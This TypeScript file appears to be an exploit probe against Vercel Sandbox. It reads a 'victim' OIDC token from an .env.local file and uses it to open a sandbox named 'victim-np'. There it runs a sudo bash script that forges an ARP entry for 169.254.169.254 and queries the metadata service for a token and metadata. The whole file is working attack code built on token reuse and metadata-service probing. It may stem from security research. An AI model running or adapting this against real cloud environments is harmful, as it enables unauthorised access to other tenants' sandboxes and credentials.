import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
echo "=== ARP entries ==="
ip neigh show 2>&1
echo "=== ensure MMDS ARP entry ==="
ip neigh replace 169.254.169.254 lladdr 02:fc:00:00:00:01 dev eth0 nud permanent 2>&1
echo "=== MMDS token ==="
TOK=$(timeout 4 curl -sv --max-time 4 -X PUT "http://169.254.169.254/latest/api/token" -H "X-metadata-token-ttl-seconds: 60" 2>&1 | tee /tmp/mmds.log)
echo "token rc=$? value=$(echo "$TOK" | tail -c 60)"
echo "--- curl verbose tail ---"
tail -6 /tmp/mmds.log
echo "=== MMDS root (json) ==="
timeout 4 curl -s --max-time 4 "http://169.254.169.254" -H "Accept: application/json" -H "X-metadata-token: $TOK" 2>&1 | head -c 2000
echo
echo "=== MMDS meta-data path ==="
timeout 4 curl -s --max-time 4 "http://169.254.169.254/latest/meta-data" -H "X-metadata-token: $TOK" 2>&1 | head -c 500
echo
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore19.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore19.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });